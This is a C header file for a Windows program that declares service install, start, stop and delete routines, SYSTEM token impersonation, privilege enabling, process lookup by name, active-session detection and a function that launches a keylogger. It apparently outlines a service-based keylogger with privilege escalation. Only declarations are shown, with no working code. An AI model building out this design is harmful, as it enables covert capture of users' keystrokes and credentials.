#pragma once
#pragma warning(disable: 4820)
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <wtsapi32.h>
#include "consts.h"

#define REEF(x){ if (x){ free(x); x = NULL;}}

void InstallSvc(SC_HANDLE SCManager);
void StartSvc(SC_HANDLE SCManager);
void StopSvc(SC_HANDLE SCManager);
void DeleteSvc(SC_HANDLE SCManager);


VOID ImpersonateSystemToken(LPPROCESS_INFORMATION keylogInfo);
void PrintUserNameByProc(void);
void PrintUserNameByThread(void);
void PrintPrivileges(HANDLE hToken);
DWORD GetPIDByProcName(void);
BOOL EnableAllPrivilege(HANDLE currentToken);


VOID WINAPI SvcMain(DWORD ac, LPTSTR *av);
VOID SvcInit(DWORD ac, LPTSTR *av);
VOID WINAPI SvcCtrlHandler(DWORD ctrl);
VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint);

DWORD GetActiveSessionId(void);
VOID LaunchKeylogger(LPPROCESS_INFORMATION keylogInfo);

VOID log(void *toLog);
int PrintError(void);